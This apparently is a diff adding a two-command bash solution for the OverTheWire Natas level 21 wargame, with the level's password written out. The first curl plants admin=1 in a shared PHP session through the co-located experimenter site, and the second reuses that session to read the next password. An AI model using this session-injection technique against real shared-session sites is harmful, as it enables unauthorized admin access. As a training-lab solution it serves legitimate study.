@@ -1,0 +1,7 @@
+#!/bin/bash
+
+# set session variables via $_REQUEST
+curl --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21-experimenter.natas.labs.overthewire.org/index.php?submit=1\&debug=1\&admin=1 --cookie "PHPSESSID=xanything" > /dev/null 2>&1
+
+# since both host are collocated, they share the session
+curl --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21.natas.labs.overthewire.org --cookie "PHPSESSID=xanything" 2>&1 | grep Password | cut -d "<" -f1
